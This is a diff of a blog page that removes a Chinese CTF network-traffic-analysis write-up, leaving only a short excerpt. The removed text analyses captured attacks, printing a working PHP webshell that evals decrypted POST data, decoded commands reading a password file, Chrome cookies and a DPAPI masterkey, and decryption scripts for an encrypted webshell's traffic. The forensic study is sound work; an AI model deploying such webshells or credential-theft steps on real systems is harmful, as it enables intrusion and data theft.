@@ -756,7 +756,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-04-27 09:06:52" itemprop="dateModified" datetime="2020-04-27T09:06:52+08:00">2020-04-27</time>
+                <time title="Modified: 2020-04-27 10:59:08" itemprop="dateModified" datetime="2020-04-27T10:59:08+08:00">2020-04-27</time>
               </span>
 
           
@@ -770,167 +770,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近对流量分析产生了浓厚的兴趣,做些题，学习一下，流量分析，重点在于对流量数据的提取，工具基本就是wireshark了。</p>
-<p>参考：<a href="https://jwt1399.top/2019/07/29/ctf-liu-liang-fen-xi-zong-jie/#toc-heading-15" target="_blank" rel="noopener"><a href="https://jwt1399.top/2019/07/29/ctf-liu-liang-fen-xi-zong-jie/#toc-heading-15" target="_blank" rel="noopener">https://jwt1399.top/2019/07/29/ctf-liu-liang-fen-xi-zong-jie/#toc-heading-15</a></a></p>
-<h1 id="入门题"><a href="#入门题" class="headerlink" title="入门题"></a>入门题</h1><h2 id="Cephalopod"><a href="#Cephalopod" class="headerlink" title="Cephalopod"></a>Cephalopod</h2><p>hint:我们发现一些奇怪的网络流量，我们怀疑它包含一个flag</p>
-<p>根据hint，分组字节流查找flag字段</p>
-<p><img src="/2020/03/26/Network-Traffic-Analysis/1.png" alt></p>
-<p>发现在流量中有flag.png文件。</p>
-<p>在 tcp.stream eq 2 中找到了flag.png文件。</p>
-<p><img src="/2020/03/26/Network-Traffic-Analysis/2.png" alt></p>
-<p>以原始数据保存成flag.png，删除掉头部中没有用的信息</p>
-<p><img src="/2020/03/26/Network-Traffic-Analysis/3.png" alt></p>
-<p>如下图：</p>
-<p><img src="/2020/03/26/Network-Traffic-Analysis/4.png" alt></p>
-<p>保存，获得flag。</p>
-<p><img src="/2020/03/26/Network-Traffic-Analysis/5.png" alt></p>
-<h2 id="特殊后门"><a href="#特殊后门" class="headerlink" title="特殊后门"></a>特殊后门</h2><p>hint:</p>
-<p><img src="/2020/03/26/Network-Traffic-Analysis/6.png" alt></p>
-<p>这题有点脑洞，在icmp中查找flag</p>
-<p><img src="/2020/03/26/Network-Traffic-Analysis/7.png" alt="1572584591707"></p>
-<p>然后从这条icmp报文以后的内容中包含flag的一个字符。</p>
-<p><img src="/2020/03/26/Network-Traffic-Analysis/8.png" alt="1572584666124"></p>
-<p>全部拼完，会得到flag</p>
-<h1 id="进阶题"><a href="#进阶题" class="headerlink" title="进阶题"></a>进阶题</h1><h2 id="抓住一只苍蝇"><a href="#抓住一只苍蝇" class="headerlink" title="抓住一只苍蝇"></a>抓住一只苍蝇</h2><p>题目给的hint是抓住一只苍蝇…..</p>
-<p>过滤</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains <span class="string">"苍蝇"</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/03/26/Network-Traffic-Analysis/9.png" alt></p>
-<p> 猜测是在发送邮件，并且发送了压缩包 fly.rar</p>
-<p>过滤数据包</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.requests.post</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/03/26/Network-Traffic-Analysis/10.png" alt></p>
-<p>第一个数据包调用了函数createFile()，猜测后面的五个数据包为fly.rar的内容。</p>
-<p>导出HTTP对象</p>
-<p><img src="/2020/03/26/Network-Traffic-Analysis/11.png" alt></p>
-<p>分别保存成1,2,3,4,5文件，然后由于这是一个tcp包，没一次传输都会带上tcp头文件</p>
-<p><img src="/2020/03/26/Network-Traffic-Analysis/12.png" alt></p>
-<p>一个数据包的大小是525701字节，然后这五个数据包的大小又是 131*1024 * 4+1777 = 527521</p>
-<p>那么每个tcp头的大小就是：（527521-525701）/ 4 = 364 字节</p>
-<p>然后我们使用dd命令分离这五个数据包的数据部分</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">dd <span class="keyword">if</span>=<span class="number">1</span> bs=<span class="number">1</span> skip=<span class="number">364</span> of=<span class="number">1.1</span></span><br><span class="line">dd <span class="keyword">if</span>=<span class="number">2</span> bs=<span class="number">1</span> skip=<span class="number">364</span> of=<span class="number">2.1</span></span><br><span class="line">dd <span class="keyword">if</span>=<span class="number">3</span> bs=<span class="number">1</span> skip=<span class="number">364</span> of=<span class="number">3.1</span></span><br><span class="line">dd <span class="keyword">if</span>=<span class="number">4</span> bs=<span class="number">1</span> skip=<span class="number">364</span> of=<span class="number">4.1</span></span><br><span class="line">dd <span class="keyword">if</span>=<span class="number">5</span> bs=<span class="number">1</span> skip=<span class="number">364</span> of=<span class="number">5.1</span></span><br><span class="line"></span><br><span class="line">dd命令语法：</span><br><span class="line"><span class="keyword">if</span> 输入文件名</span><br><span class="line">bs 设置每次读写块的大小为<span class="number">1</span>字节 </span><br><span class="line">skip 指定从输入文件开头跳过多少个块后再开始复制</span><br><span class="line">of 输出文件名</span><br></pre></td></tr></table></figure>
-
-<p>接着</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="number">1.1</span> <span class="number">2.1</span> <span class="number">3.1</span> <span class="number">4.1</span> <span class="number">5.1</span> &gt; fly.rar</span><br></pre></td></tr></table></figure>
-
-<p>获得fly.rar后，伪加密。修改一下二进制文件。解压，binwalk就好了…..</p>
-<h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><p>流量分析题的思路,个人认为除非是脑洞题….但是现在脑洞题很少了,所以分析流量数据要想想流量中的数据体现的是什么…….</p>
-<h2 id="1-360初赛流量分析题"><a href="#1-360初赛流量分析题" class="headerlink" title="(1) 360初赛流量分析题"></a>(1) 360初赛流量分析题</h2><p><img src="/2020/03/26/Network-Traffic-Analysis/22.png" alt></p>
-<p>过滤只留下http的数据,我们可以看到这里的数据告诉我们黑客是在进行sql注入,仔细一看,这个实在sql盲注,然后如果盲注的结果为true的话,返回的数据长度就是987,如果盲注的结果为false的话,那返回的数据长度就是1003.既然是盲注.那么最后黑客总是要注出点东西的.直接看到最后面</p>
-<p><img src="/2020/03/26/Network-Traffic-Analysis/23.png" alt="1573717977085"></p>
-<p>发现他在注数据库中的passwd还有url</p>
-<p>passwd:bkis</p>
-<p>url:t.cn/Ai8PhqSb</p>
-<p>访问这个百度网盘,获得flag.zip压缩包,并且我们导出HTTP对象,发现一个readme.7z,解压后有一个readme.txt</p>
-<p><img src="/2020/03/26/Network-Traffic-Analysis/24.png" alt="1573718847926"></p>
-<p>而且flag.zip中有一个readme.txt,尝试使用明文攻击.</p>
-<p>使用7z对readme.txt进行压缩</p>
-<p><img src="/2020/03/26/Network-Traffic-Analysis/25.png" alt="1573719256684"></p>
-<h2 id="2-360复赛流量分析题"><a href="#2-360复赛流量分析题" class="headerlink" title="(2) 360复赛流量分析题"></a>(2) 360复赛流量分析题</h2><p>第19 条数据</p>
-<p><img src="/2020/03/26/Network-Traffic-Analysis/13.png" alt></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'pass'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $key=substr(md5(uniqid(rand())),<span class="number">16</span>);</span><br><span class="line">    $_SESSION[<span class="string">'k'</span>]=$key;</span><br><span class="line">    <span class="keyword">print</span> $key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $key=$_SESSION[<span class="string">'k'</span>];</span><br><span class="line">	$post=file_get_contents(<span class="string">"php://input"</span>);</span><br><span class="line">	<span class="keyword">if</span>(!extension_loaded(<span class="string">'openssl'</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		$t=<span class="string">"base64_"</span>.<span class="string">"decode"</span>;</span><br><span class="line">		$post=$t($post.<span class="string">""</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($post);$i++) &#123;</span><br><span class="line">    			 $post[$i] = $post[$i]^$key[$i+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		$post=openssl_decrypt($post, <span class="string">"AES128"</span>, $key);</span><br><span class="line">	&#125;</span><br><span class="line">    $arr=explode(<span class="string">'|'</span>,$post);</span><br><span class="line">    $func=$arr[<span class="number">0</span>];</span><br><span class="line">    $params=$arr[<span class="number">1</span>];</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($p)</span> </span>&#123;<span class="keyword">eval</span>($p.<span class="string">""</span>);&#125;&#125;</span><br><span class="line">	@<span class="keyword">new</span> C($params);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>这段代码,是传了一个木马上去,然后通过一个pass获得一个key.</p>
-<p><img src="/2020/03/26/Network-Traffic-Analysis/14.png" alt></p>
-<p>这里上传pass,获得一个key.</p>
-<p><img src="/2020/03/26/Network-Traffic-Analysis/15.png" alt></p>
-<p><img src="/2020/03/26/Network-Traffic-Analysis/16.png" alt></p>
-<p>接着我们会看到它,后面就一直在post一些数据上去….</p>
-<p><img src="/2020/03/26/Network-Traffic-Analysis/17.png" alt></p>
-<p>根据它给的密文,以及他上传的shell,编写解码demo</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $post=$_POST[<span class="string">'post'</span>];</span><br><span class="line">    $key=d59042be6e437849;</span><br><span class="line">    $post=openssl_decrypt($post,<span class="string">"AES128"</span>, $key);</span><br><span class="line">    $arr=explode(<span class="string">'|'</span>,$post);</span><br><span class="line">    $func=$arr[<span class="number">0</span>];</span><br><span class="line">    $params=$arr[<span class="number">1</span>];</span><br><span class="line">    var_dump($func);</span><br><span class="line">    var_dump($params);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<p>http数据包320</p>
-<p>解码结果:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$path=<span class="string">"C:/Users/shadow/Desktop/password.txt"</span>;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>http数据包501</p>
-<p>解码结果:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$path=<span class="string">"C:/Users/shadow/AppData/Local/Google/Chrome/User Data/Default/Cookies"</span>;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>http数据包653</p>
-<p>解码结果:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$path=<span class="string">"C:/Users/shadow/AppData/Roaming/Microsoft/Protect/S-1-5-21-2127750816-4215895028-2373289296-1001/6ecf76bd-1803-437e-92e6-28dd36c907aa"</span>;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>http请求返回的数据像这样</p>
-<p><img src="/2020/03/26/Network-Traffic-Analysis/18.png" alt></p>
-<p>看这请求的数据我们也能知道,这个黑客是在读取这个Chrome的cookie.</p>
-<p>第一个数据返回的是password:p@ssw0rd</p>
-<p>第三个数据返回的masterkey-file</p>
-<p>第二个返回的是cookie</p>
-<p>我们的目的是解密cookie,使用工具mimikatz可以解密.</p>
-<p>参考文章: <a href="https://xz.aliyun.com/t/6508" target="_blank" rel="noopener"><a href="https://xz.aliyun.com/t/6508" target="_blank" rel="noopener">https://xz.aliyun.com/t/6508</a></a></p>
-<p>​                  <a href="https://bbs.pediy.com/thread-247634-1.htm" target="_blank" rel="noopener"><a href="https://bbs.pediy.com/thread-247634-1.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-247634-1.htm</a></a></p>
-<p>我们可以使用masterkey_file和password获得获得masterkey,其中masterkey的位置要和数据包中给的一样.</p>
-<p><img src="/2020/03/26/Network-Traffic-Analysis/19.png" alt></p>
-<p><img src="/2020/03/26/Network-Traffic-Analysis/20.png" alt></p>
-<p><img src="/2020/03/26/Network-Traffic-Analysis/21.png" alt></p>
-<h2 id="3-awdSHELL-2020年安恒四月赛"><a href="#3-awdSHELL-2020年安恒四月赛" class="headerlink" title="(3) awdSHELL-2020年安恒四月赛"></a>(3) awdSHELL-2020年安恒四月赛</h2><p>这道题开题后，是一个用户上传shell，取flag的过程</p>
-<p>现在找到用户上传的shell</p>
-<p><img src="/2020/03/26/Network-Traffic-Analysis/26.png" alt="image-20200427080617114"></p>
-<p>跟踪一下</p>
-<p><img src="/2020/03/26/Network-Traffic-Analysis/27.png" alt="image-20200427080734369"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">根据这个awdshell.php可以看到用户通过$ant经POST传入的内容一定是经过加密的密文</span><br></pre></td></tr></table></figure>
-
-<p>awdshell.php在上传后更名为如下：</p>
-<p><img src="/2020/03/26/Network-Traffic-Analysis/28.png" alt="image-20200427081453102"></p>
-<p>于是我们继续跟踪流，找到这个用户后期上传到<code>awdshell.php</code>的内容</p>
-<p>在流32</p>
-<p><img src="/2020/03/26/Network-Traffic-Analysis/29.png" alt="image-20200427081608528"></p>
-<p>经过解密exp:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">BTGSM8GnyYMyhWUZbk8URh+5LlbDF5BJLF+XnAAAl+C9UmZWQXlM6NZrop8EaVIqtREDq2AXijBfKObw6CdXbnrqvxnPA0x3V/h/WOieCNjfiUzNgo2Uzar6rsvlnQmFqDRakh/VZx1EbSIbVr9306Db35WtUQ/m4gIHMDt17Gw=|A6LGjeyvCNVwbWsAxDgTH5v7drLEPdD5/PUpqGwDOq+N+P1ivPL3N/Rm29tvf9XtweWcFFTZaHAorET0fb7usWqEpKdho4dZuRwrymPkaHEJ9x9mJYS146YZuvVlhn+Hdiwk1jhsQw2yQhUki5xfIYVCJKma7u7pNlsgSl7a0ys=|C/EfnM80hLqAMbSCeb8sCIVWrQhEeU8VL5c76OeFTMdiwIKlQ6w1c0TAZrqoRk5VhfFj53ilcmNeZZw0EZENrrZl8Iwr5E9oaalHtAF6NTRT5RocnSHqSgObCWz97I1J8pCGBaiIusDWx1PlUMb/Z0/KzbTSzfCdHj0mXPpBRm0=|gdloKWWMdzUyMlZLIvYGS/ePAd+8Aqqbg8y9fNf22Amt+BfzgPgmlGhJsmjRL1HN+pQ4OHNK1AOIVTmOA/FSqrnMt0FDfweX31peoocxZySu3+Yo9+FyO8idKW0nV//wfvU3UigA+MXXHd2KaDJSr/H3CFxPD5R8sBzu1BxPLBo=|JaV9bxKoXxvaapoLnhNWyQxsmPS2lH/Iz/QNOkJL6zNq+vfuzyA0lZykObOIjoeZy7Hs4E4ZV52rqdz2Kj8u5nEkUeKyB5/TcU+YGlPHzdxCxdF/LeIR5Bdk+OZyXg9lNe41AhC7nB+ILJG5rFXYmHP4MRCL2fQtJxOTLPK+KsI=|e644juHsnSn5Ee3vJytQy0g+DrEUivyhzcUka3FyapNrK+x2rw+wBjilACp7UAgXyqV87ecriIAHiOZRwFVF/PJzPQxVdYjf1UYTD85tA1hW2QXUjJ40PbDVHj7KNcz5mcXfhxf2oKVxEs8VSaV5s/oLY947i/ob9cK5OD7BRLI=|fzghKQChfhqtiF4LNyKTTt0knEpvyvLwmARGrz9/9Nzq8zooK5OL+FfWl8caiXutzEtno/y7R+WZYPIBC4C1Xw1pH2Ddmg9yH0UNeoNFnLQ2NHw/R3FqnyCjHGSa8QWBd9GW6DkvzX2dyASr/VRaO02jmXpIiBj3qH+Jybd1K/g=|FOJF7u+TBO87Qx3M00QcmXfkemu7EyUJIpxseE1/93VFbzewXknHboDDqmh5eLlrqdedw/C2oAuSKNG6nRdgqXO6y6eKAAgohWQrkUO2PHcAd5DE+DwHQvrzAHemHSygbJGp3MkXxt2acD6bRlMpLsurST/f8n8t0j1P9u4YXfA=|Bl9SXQgvZX4/2I/hztQN8fcsMvTSOgrfAmms3+2y2bnMeblIxy1k2Nbie5/A9GFrM5HgxpkoAXEa9nr1rWhVxeGr1z4kP7F7E82dDzXkkTfZYt/2DLSRoOqXVzKVomprIEZYbCeD11dT/i9wKZNDewmP4xAXkRtzgh54exH9IiI=|FujB2nTxNy/rJ8J2iA1mKovFuxFmqP5qUxuq6NQvxReD/AtcW6lNO1mzxPwI/cjPRtxG1qWnMl84DcAAOHjkiPeMHXzGDZkGDmWSChF21IAN0jYU6TPV6Ftg9TJ68x10eVBccAlJnkjyo3189xVkhglgS9cyVQxb9VlxN4oR5lI=|MLxeOXoAXDx5ks22DCxawTxLTAgGkPzL3dFZLM9tGanSTG3MXplU0gBPmiOGIhfHDWKG/a1o2aGSPhkuNGqs3Gpg986MTpPH3l/d8onRFnvKVVGOanir4TZYoYvdPXfXMv60NZrsgrZBvyabS/LixfR9CSxUlyv9ztJxbp56Mmk=</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"></span><br><span class="line">$pk = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCmXoXBvXeanxgl51HBm2J6HPNh</span></span><br><span class="line">TQtfb8ICioE+n0Ni0DlBFHSBprbsWYKJywVfdhJbLDCCon68uA1UYuy0yteDog3j</span><br><span class="line">OdweW2bscEGmeMXLQJfBHpQrg4wWoYJjD3QsKorYT6kdp1LRkuHE3PbpqvRtqO7A</span><br><span class="line">LzrcBi88Eu7oZaPANwIDAQAB</span><br><span class="line">-----END <span class="keyword">PUBLIC</span> KEY-----</span><br><span class="line">EOF;</span><br><span class="line">$cmds = explode(<span class="string">"|"</span>, $cmd);</span><br><span class="line">$pk = openssl_pkey_get_public($pk);</span><br><span class="line">$cmd = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($cmds <span class="keyword">as</span> $value) &#123;</span><br><span class="line">    <span class="keyword">if</span> (openssl_public_decrypt(base64_decode($value), $de, $pk)) &#123;</span><br><span class="line">        $cmd .= $de;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> $cmd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//eval($cmd);</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/03/26/Network-Traffic-Analysis/30.png" alt="image-20200427081713478"></p>
-<p><img src="/2020/03/26/Network-Traffic-Analysis/31.png" alt="image-20200427081851255"></p>
-<p>解密后的代码中关键的主要是这两个函数</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span><span class="params">($out)</span> </span>&#123;</span><br><span class="line">	@session_start();</span><br><span class="line">	$key=@substr(str_pad(session_id(),<span class="number">16</span>,<span class="string">'a'</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">	<span class="keyword">return</span> @base64_encode(openssl_encrypt(base64_encode($out), <span class="string">'AES-128-ECB'</span>, $key, OPENSSL_RAW_DATA));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	$output=ob_get_contents();</span><br><span class="line">	ob_end_clea@ini_set(<span class="string">"display_errors"</span>, <span class="string">"0"</span>);</span><br><span class="line">	@set_time_limit(<span class="number">0</span>);</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">asenc</span><span class="params">($out)</span> </span>&#123;</span><br><span class="line">		@session_start();</span><br><span class="line">		$key=@substr(str_pad(session_id(),<span class="number">16</span>,<span class="string">'a'</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">		<span class="keyword">return</span> @base64_encode(openssl_encrypt(base64_encode($out), <span class="string">'AES-128-ECB'</span>, $key, OPENSSL_RAW_DATA));&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这两个函数中的<code>$key</code>是截取<code>session_id</code>的前16位，其中如果<code>session_id</code>不够16位则通过<code>字符a</code>来填充</p>
-<p>那可见在获取数据时，返回的数据是密文。</p>
-<p>接着我们继续往后跟踪至流36</p>
-<p><img src="/2020/03/26/Network-Traffic-Analysis/32.png" alt="image-20200427083134821"></p>
-<p>这里除了上传代码，害传入其他的内容，base64解密后：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">L2Jpbi9zaA==</span><br><span class="line">/bin/sh</span><br><span class="line"></span><br><span class="line">Y2QgIi92YXIvd3d3L2h0bWwvYWRtaW4vdXBsb2FkIjtscztlY2hvIFtTXTtwd2Q7ZWNobyBbRV0=</span><br><span class="line">cd <span class="string">"/var/www/html/admin/upload"</span>;ls;<span class="keyword">echo</span> [S];pwd;<span class="keyword">echo</span> [E]</span><br></pre></td></tr></table></figure>
-
-<p>上面的代码密文解密后，关键代码如下：</p>
-<p><img src="/2020/03/26/Network-Traffic-Analysis/33.png" alt="image-20200427083452145"></p>
-<p>所有根据上述分析，返回的密文内容为<code>91ca55dc+密文+ab213e</code></p>
-<p>所以除去前后的无用字符</p>
-<p><img src="/2020/03/26/Network-Traffic-Analysis/34.png" alt="image-20200427083907739"></p>
-<p>而密文就是服务器返回给我们的内容</p>
-<p>根据</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> @base64_encode(openssl_encrypt(base64_encode($out), <span class="string">'AES-128-ECB'</span>, $key, OPENSSL_RAW_DATA))</span><br></pre></td></tr></table></figure>
-
-
-
-<p>编写exp:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sess_id&#x3D;&#39;hm3pq66843bbbrdgphntt8fmc4&#39;;</span><br><span class="line">$key&#x3D;@substr(str_pad($sess_id,16,&#39;a&#39;),0,16);</span><br><span class="line">$out&#x3D;&lt;&lt;&lt;EOF</span><br><span class="line">密文</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">echo @base64_decode(openssl_decrypt(base64_decode($out), &#39;AES-128-ECB&#39;, $key, OPENSSL_RAW_DATA));</span><br></pre></td></tr></table></figure>
-
-
-
-<p>然后跟到流38</p>
-<p><img src="/2020/03/26/Network-Traffic-Analysis/35.png" alt="image-20200427084737854"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd <span class="string">"/var/www/html/admin/upload"</span>;cat flag;<span class="keyword">echo</span> [S];pwd;<span class="keyword">echo</span> [E]</span><br></pre></td></tr></table></figure>
-
-<p>流38返回的结果，是flag</p>
-<p>像分析流36一样，去解密加密的代码，找到无用字符，截取其中的密文，然后使用exp解密</p>
-<p><img src="/2020/03/26/Network-Traffic-Analysis/36.png" alt="image-20200427085119845"></p>
-<p><img src="/2020/03/26/Network-Traffic-Analysis/37.png" alt="image-20200427085746945"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sess_id = <span class="string">'hm3pq66843bbbrdgphntt8fmc4'</span>;</span><br><span class="line">$key = @substr(str_pad($sess_id, <span class="number">16</span>, <span class="string">'a'</span>), <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">$out = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">+L8pc9pJEhqPQ1cmL18eJXX9QGADkKnp8A1j7s4oX2Qo8YJNGNTbuaXu+OfynYgRewqyfLj/Wrg0rgKj/cRdO4zJMmfLfyFVB4pBRYeTetM0G/w/Px6+xI/WPlRrx/+MvK6eQyPr+xDqTX82AqiGrOYDwN94/vuGcLS7NAxhty4=</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"></span><br><span class="line">$res=@base64_decode(openssl_decrypt(base64_decode($out), <span class="string">'AES-128-ECB'</span>, $key, OPENSSL_RAW_DATA));</span><br><span class="line"><span class="keyword">echo</span> base64_decode($res);</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/03/26/Network-Traffic-Analysis/38.png" alt="image-20200427090240028"></p>
-
+          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>流量分析，重点在于对流量数据的提取，工具基本就是wireshark了。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/03/26/Network-Traffic-Analysis/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
